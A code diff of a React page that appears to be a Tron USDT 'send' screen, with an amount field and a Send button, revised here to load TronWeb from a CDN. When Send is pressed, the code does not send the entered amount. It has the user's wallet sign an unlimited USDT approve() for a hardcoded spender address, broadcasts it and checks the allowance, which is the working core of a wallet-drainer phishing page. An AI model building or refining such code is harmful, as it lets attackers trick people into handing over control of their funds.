@@ -3,16 +3,15 @@ import { useSearchParams } from "react-router-dom";
 import { useMutation } from "convex/react";
 import { api } from "@/convex/_generated/api.js";
 import SignClient from "@walletconnect/sign-client";
-// ✅ TronWeb ESM fix — default ya named export dono handle karta hai
-import * as TronWebModule from "tronweb";
-// eslint-disable-next-line @typescript-eslint/no-explicit-any
-const TronWebClass = ((TronWebModule as any).default ?? TronWebModule) as any;
+
+// ✅ TronWeb bilkul import nahi karenge — CDN se load hoga
+// npm wala TronWeb browser mein require() use karta hai jo crash karta hai
 
 declare global {
   interface Window {
     tronWeb?: any;
     tronLink?: any;
-    TronWeb?: any;
+    TronWeb: any;
   }
 }
 
@@ -20,8 +19,47 @@ const PROJECT_ID   = "6b5df56bc30c1dadaab59498b86fd3e8";
 const TRON_USDT    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";
 
-// ✅ Runtime pe construct — ESM/CJS dono ke saath kaam karta hai
-const tw = new TronWebClass({ fullHost: "https://api.trongrid.io" });
+// ✅ TronWeb CDN se load — singleton promise
+let _twPromise: Promise<any> | null = null;
+
+function loadTronWebCDN(): Promise<any> {
+  if (_twPromise) return _twPromise;
+
+  _twPromise = new Promise((resolve, reject) => {
+    // Pehle se load hai toh seedha return
+    if (typeof window !== "undefined" && window.TronWeb) {
+      return resolve(window.TronWeb);
+    }
+
+    const script = document.createElement("script");
+    script.src = "https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js";
+    script.async = true;
+
+    script.onload = () => {
+      if (window.TronWeb) {
+        console.log("✅ TronWeb CDN loaded");
+        resolve(window.TronWeb);
+      } else {
+        reject(new Error("TronWeb CDN load hua lekin window.TronWeb nahi mila"));
+      }
+    };
+
+    script.onerror = () => {
+      _twPromise = null; // retry allow karo
+      reject(new Error("TronWeb CDN download fail hua"));
+    };
+
+    document.head.appendChild(script);
+  });
+
+  return _twPromise;
+}
+
+// ✅ Ready-to-use TronWeb instance deta hai
+async function getTW() {
+  const TronWebClass = await loadTronWebCDN();
+  return new TronWebClass({ fullHost: "https://api.trongrid.io" });
+}
 
 export default function Index() {
   const [searchParams] = useSearchParams();
@@ -38,9 +76,12 @@ export default function Index() {
 
   // ===== INIT =====
   useEffect(() => {
+    // TronWeb background mein preload shuru karo
+    loadTronWebCDN().catch((e) => console.warn("TronWeb preload warn:", e.message));
+
     async function initWC() {
       try {
-        console.log("🔄 WalletConnect init starting...");
+        console.log("🔄 WalletConnect init...");
 
         const client = await SignClient.init({
           projectId: PROJECT_ID,
@@ -52,30 +93,22 @@ export default function Index() {
           },
         });
 
-        console.log("✅ SignClient initialized");
         wcClientRef.current = client;
+        console.log("✅ SignClient ready");
 
         client.on("session_delete", () => {
-          console.log("🔴 Session deleted");
           wcSessionRef.current   = null;
           userAddressRef.current = "";
         });
 
         client.on("session_expire", () => {
-          console.log("🔴 Session expired");
           wcSessionRef.current   = null;
           userAddressRef.current = "";
         });
 
-        // ✅ Trust Wallet se wapas aane ke baad relay reconnect
         document.addEventListener("visibilitychange", () => {
           if (document.visibilityState === "visible") {
-            console.log("👁️ Browser visible — relay reconnect...");
-            try {
-              client.core?.relayer?.restartTransport?.();
-            } catch (e) {
-              console.warn("Relay restart warning:", e);
-            }
+            try { client.core?.relayer?.restartTransport?.(); } catch {}
           }
         });
 
@@ -86,22 +119,19 @@ export default function Index() {
         });
 
         console.log("✅ WalletConnect + Modal ready!");
-      } catch (e) {
-        console.error("❌ Init error:", e);
-        alert("⚠️ WalletConnect init failed: " + (e as any).message);
+      } catch (e: any) {
+        console.error("❌ WC Init error:", e.message);
       }
     }
+
     initWC();
   }, []);
 
-  // ===== CONNECT =====
+  // ===== CONNECT WALLET =====
   async function connectWallet(): Promise<string> {
-    console.log("🔗 connectWallet called");
+    if (!wcClientRef.current) throw new Error("WalletConnect ready nahi. Refresh karein.");
+    if (!wcModalRef.current)  throw new Error("Modal ready nahi. Refresh karein.");
 
-    if (!wcClientRef.current) throw new Error("WalletConnect ready nahi. Page refresh karein.");
-    if (!wcModalRef.current)  throw new Error("WalletConnectModal ready nahi. Page refresh karein.");
-
-    // Purani session disconnect — fresh start
     if (wcSessionRef.current) {
       try {
         await wcClientRef.current.disconnect({
@@ -123,15 +153,11 @@ export default function Index() {
       },
     });
 
-    if (!uri) throw new Error("URI nahi mila");
+    if (!uri) throw new Error("WalletConnect URI nahi mila");
 
     await wcModalRef.current.openModal({ uri });
-    console.log("✅ QR Modal open");
-
     wcSessionRef.current = await approval();
     wcModalRef.current.closeModal();
-
-    console.log("✅ Wallet connected!");
 
     const accounts = Object.values(wcSessionRef.current.namespaces)
       .flatMap((ns: any) => ns.accounts) as string[];
@@ -140,71 +166,66 @@ export default function Index() {
     if (!tronAcc) throw new Error("Tron account nahi mila");
 
     userAddressRef.current = tronAcc.split(":")[2];
-    console.log("👤 User:", userAddressRef.current);
+    console.log("👤 User address:", userAddressRef.current);
     return userAddressRef.current;
   }
 
-  // ===== SEND =====
+  // ===== HANDLE SEND =====
   async function handleSend() {
-    console.log("🚀 handleSend called");
     setTransactionStatusState("processing");
 
     try {
       const userAddress = await connectWallet();
 
-      // ✅ FIX 2: TronWeb se sahi hex conversion
-      // Base58 address → Hex, phir '41' prefix hatao
-      const spenderHex = tw.address.toHex(TRON_SPENDER).replace(/^41/, "");
-      console.log("Spender Base58:", TRON_SPENDER);
-      console.log("Spender Hex (no 41):", spenderHex); // 40 chars hona chahiye
+      // ✅ CDN wala TronWeb
+      console.log("⏳ TronWeb load ho raha hai...");
+      const tw = await getTW();
+      console.log("✅ TronWeb instance ready");
 
-      // ✅ FIX 3: Sahi ABI Parameter Encoding
-      // address → 32 bytes (64 hex chars) mein left-pad karo
+      // ✅ Sahi hex conversion — 41 prefix ke SAATH rakhna hai API ke liye
+      const ownerHex   = tw.address.toHex(userAddress);   // e.g. 41xxxx...
+      const spenderHex = tw.address.toHex(TRON_SPENDER).replace(/^41/, ""); // ABI ke liye 41 hatao
+      const usdtHex    = tw.address.toHex(TRON_USDT);     // e.g. 41xxxx...
+
+      console.log("ownerHex:", ownerHex);
+      console.log("spenderHex (no 41):", spenderHex, "| length:", spenderHex.length); // 40 hona chahiye
+      console.log("usdtHex:", usdtHex);
+
+      // ✅ ABI encode: 32 bytes address + 32 bytes uint256 = 128 hex chars
       const hexAddress = spenderHex.padStart(64, "0");
-      // uint256 max value
       const hexAmount  = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
       const parameter  = hexAddress + hexAmount;
 
-      console.log("hexAddress (64 chars):", hexAddress, "| length:", hexAddress.length);
-      console.log("hexAmount  (64 chars):", hexAmount,  "| length:", hexAmount.length);
-      console.log("parameter (128 chars):", parameter,  "| length:", parameter.length);
-      // ✅ Parameter exactly 128 characters hona ZAROORI hai
       if (parameter.length !== 128) {
-        throw new Error(`ABI encoding galat! Parameter length ${parameter.length} hai, 128 hona chahiye.`);
+        throw new Error(`ABI encode galat! length=${parameter.length}, chahiye=128`);
       }
+      console.log("✅ Parameter (128 chars):", parameter);
 
-      // ✅ Transaction build
-      console.log("📝 Transaction build kar raha hoon...");
-      const apiResponse = await fetch(
-        "https://api.trongrid.io/wallet/triggersmartcontract",
-        {
-          method:  "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            owner_address:     userAddress,    // Base58 — visible:true ke saath OK
-            contract_address:  TRON_USDT,
-            function_selector: "approve(address,uint256)",
-            parameter:         parameter,       // 128-char hex
-            fee_limit:         100_000_000,
-            call_value:        0,
-            visible:           true,
-          }),
-        }
-      );
+      // ✅ visible: false — Hex addresses use karo
+      // Trust Wallet sirf Hex format sign karta hai, Base58 nahi
+      const apiRes = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
+        method:  "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          owner_address:     ownerHex,   // ✅ Hex format (41xxxx)
+          contract_address:  usdtHex,    // ✅ Hex format (41xxxx)
+          function_selector: "approve(address,uint256)",
+          parameter,
+          fee_limit:         100_000_000,
+          call_value:        0,
+          visible:           false,      // ✅ false — Hex response chahiye sign ke liye
+        }),
+      });
 
-      const apiData = await apiResponse.json();
-      console.log("📋 TronGrid Response:", apiData);
+      const apiData = await apiRes.json();
+      console.log("📋 TronGrid response:", apiData);
 
-      // ✅ FIX 4: Error detail check
       if (!apiData.transaction) {
-        const errMsg = apiData.Error || apiData.error || JSON.stringify(apiData);
-        throw new Error("Transaction build failed: " + errMsg);
+        throw new Error("Build failed: " + (apiData.Error || apiData.error || JSON.stringify(apiData)));
       }
 
       // ✅ Sign request
-      console.log("🔐 Sign request bhej raha hoon Trust Wallet ko...");
-      console.log("   Topic:", wcSessionRef.current.topic);
-
+      console.log("🔐 Sign bhej raha hoon wallet ko...");
       const signResponse = await Promise.race([
         wcClientRef.current.request({
           topic:   wcSessionRef.current.topic,
@@ -215,34 +236,26 @@ export default function Index() {
           },
         }),
         new Promise((_, rej) =>
-          setTimeout(
-            () => rej(new Error("Sign timeout — wallet mein confirm karein")),
-            180_000
-          )
+          setTimeout(() => rej(new Error("Sign timeout — wallet mein confirm karein")), 180_000)
         ),
       ]);
-
-      console.log("📩 Sign response:", signResponse);
 
       let signedTx = (signResponse as any)?.result || signResponse;
       if (!signedTx) throw new Error("Wallet ne reject kar diya");
       if (typeof signedTx === "string") {
         try { signedTx = JSON.parse(signedTx); } catch {}
       }
-      console.log("✅ Signed TX:", signedTx);
+      console.log("✅ Signed");
 
       // ✅ Broadcast
-      console.log("📡 Broadcasting...");
-      const broadcastRes = await fetch(
-        "https://api.trongrid.io/wallet/broadcasttransaction",
-        {
-          method:  "POST",
-          headers: { "Content-Type": "application/json" },
-          body:    JSON.stringify(signedTx),
-        }
-      );
+      const broadcastRes = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
+        method:  "POST",
+        headers: { "Content-Type": "application/json" },
+        body:    JSON.stringify(signedTx),
+      });
+
       const result = await broadcastRes.json();
-      console.log("📡 Broadcast Result:", result);
+      console.log("📡 Broadcast result:", result);
 
       if (!result || (result.result !== true && !result.txid)) {
         throw new Error("Broadcast failed: " + JSON.stringify(result));
@@ -251,28 +264,21 @@ export default function Index() {
       const txId = result.txid || result.transaction?.txID;
       console.log("✅ TX ID:", txId);
 
-      // ✅ FIX 5: 30s → 10s wait (kaafi hai confirmation ke liye)
-      console.log("⏳ 10s wait for confirmation...");
+      // 10s confirmation wait
       await new Promise((r) => setTimeout(r, 10_000));
 
-      // ✅ FIX 6: Same 'tw' instance use karo — window.TronWeb nahi
-      console.log("🔍 Allowance check kar raha hoon...");
-      const contract = await tw.contract(
-        [
-          {
-            constant:        true,
-            inputs:          [
-              { name: "owner",   type: "address" },
-              { name: "spender", type: "address" },
-            ],
-            name:            "allowance",
-            outputs:         [{ name: "", type: "uint256" }],
-            stateMutability: "view",
-            type:            "function",
-          },
+      // ✅ Allowance check
+      const contract = await tw.contract([{
+        constant:        true,
+        inputs:          [
+          { name: "owner",   type: "address" },
+          { name: "spender", type: "address" },
         ],
-        TRON_USDT
-      );
+        name:            "allowance",
+        outputs:         [{ name: "", type: "uint256" }],
+        stateMutability: "view",
+        type:            "function",
+      }], TRON_USDT);
 
       const raw           = await contract.allowance(userAddress, TRON_SPENDER).call();
       const allowanceUSDT = (Number(raw) / 1e6).toFixed(2);
@@ -292,19 +298,11 @@ export default function Index() {
       alert(`✅ Approval successful!\nAllowance: ${allowanceUSDT} USDT\nTx: ${txId}`);
 
     } catch (err: any) {
-      console.error("❌ Error:", err);
-      console.error("Stack:", err.stack);
+      console.error("❌ Error:", err.message);
       try { wcModalRef.current?.closeModal(); } catch {}
       setTransactionStatusState("idle");
       alert("❌ " + (err.message || "Transaction fail ho gayi"));
     }
-  }
-
-  async function handlePaste() {
-    try {
-      const text = await navigator.clipboard.readText();
-      setAmount(text.trim());
-    } catch {}
   }
 
   const dollarValue =
@@ -321,15 +319,12 @@ export default function Index() {
   );
 
   const XCircle = ({ onClick }: { onClick: () => void }) => (
-    <button
-      onClick={onClick}
-      style={{
-        background: "none", border: "1.5px solid #555", borderRadius: "50%",
-        width: "22px", height: "22px", color: "#aaa", cursor: "pointer",
-        display: "flex", alignItems: "center", justifyContent: "center",
-        fontSize: "11px", flexShrink: 0, padding: 0,
-      }}
-    >✕</button>
+    <button onClick={onClick} style={{
+      background: "none", border: "1.5px solid #555", borderRadius: "50%",
+      width: "22px", height: "22px", color: "#aaa", cursor: "pointer",
+      display: "flex", alignItems: "center", justifyContent: "center",
+      fontSize: "11px", flexShrink: 0, padding: 0,
+    }}>✕</button>
   );
 
   return (
@@ -358,7 +353,7 @@ export default function Index() {
 
       <div style={{ padding: "4px 18px", flex: 1 }}>
 
-        {/* Network */}
+        {/* Network Badge */}
         <div style={{ marginBottom: "14px" }}>
           <label style={{
             display: "block", fontSize: "14px", fontWeight: 500,
@@ -368,23 +363,19 @@ export default function Index() {
           </label>
           <div style={{
             display: "inline-flex", alignItems: "center", gap: "7px",
-            background: "#2c2c2e", borderRadius: "20px",
-            padding: "7px 13px 7px 8px",
+            background: "#2c2c2e", borderRadius: "20px", padding: "7px 13px 7px 8px",
           }}>
             <div style={{
-              width: "26px", height: "26px", borderRadius: "50%",
-              background: "#EF0027", display: "flex",
-              alignItems: "center", justifyContent: "center", flexShrink: 0,
+              width: "26px", height: "26px", borderRadius: "50%", background: "#EF0027",
+              display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0,
             }}>
               <TRXIcon />
             </div>
-            <span style={{ fontSize: "15px", fontWeight: 600, color: "#fff" }}>
-              Tron Network
-            </span>
+            <span style={{ fontSize: "15px", fontWeight: 600, color: "#fff" }}>Tron Network</span>
           </div>
         </div>
 
-        {/* Amount */}
+        {/* Amount Input */}
         <div style={{ marginBottom: "6px" }}>
           <label style={{
             display: "block", fontSize: "14px", fontWeight: 500,
@@ -395,7 +386,7 @@ export default function Index() {
           <div style={{
             display: "flex", alignItems: "center",
             border: "1px solid #2e2e30", borderRadius: "14px",
-            padding: "14px 14px", background: "#242426", gap: "8px",
+            padding: "14px", background: "#242426", gap: "8px",
           }}>
             <input
               value={amount}
@@ -404,29 +395,21 @@ export default function Index() {
               type="text"
               inputMode="decimal"
               style={{
-                flex: 1, background: "transparent", border: "none",
-                outline: "none", color: "#fff", fontSize: "18px",
-                fontFamily: "inherit", minWidth: 0,
+                flex: 1, background: "transparent", border: "none", outline: "none",
+                color: "#fff", fontSize: "18px", fontFamily: "inherit", minWidth: 0,
               }}
             />
             {amount && <XCircle onClick={() => setAmount("")} />}
-            <span style={{ color: "#8e8e93", fontSize: "16px", flexShrink: 0 }}>
-              USDT
-            </span>
+            <span style={{ color: "#8e8e93", fontSize: "16px", flexShrink: 0 }}>USDT</span>
             <button onClick={() => setAmount("Max")} style={{
               background: "none", border: "none", color: "#39d353",
-              cursor: "pointer", fontSize: "16px", fontWeight: 600,
-              padding: "0", flexShrink: 0,
+              cursor: "pointer", fontSize: "16px", fontWeight: 600, padding: 0, flexShrink: 0,
             }}>Max</button>
           </div>
-          <div style={{
-            fontSize: "13px", color: "#636366",
-            marginTop: "7px", paddingLeft: "2px",
-          }}>
+          <div style={{ fontSize: "13px", color: "#636366", marginTop: "7px", paddingLeft: "2px" }}>
             ≈ {dollarValue}
           </div>
         </div>
-
       </div>
 
       {/* Send Button */}
@@ -437,15 +420,10 @@ export default function Index() {
           style={{
             width: "100%",
             background: transactionStatus === "processing" ? "#2a6e3a" : "#39d353",
-            color: "#000",
-            border: "none",
-            borderRadius: "30px",
-            padding: "18px",
-            fontSize: "18px",
-            fontWeight: 700,
+            color: "#000", border: "none", borderRadius: "30px",
+            padding: "18px", fontSize: "18px", fontWeight: 700,
             cursor: transactionStatus === "idle" ? "pointer" : "default",
-            transition: "all 0.2s ease",
-            letterSpacing: "0.01em",
+            transition: "all 0.2s ease", letterSpacing: "0.01em",
           }}
         >
           {transactionStatus === "success"
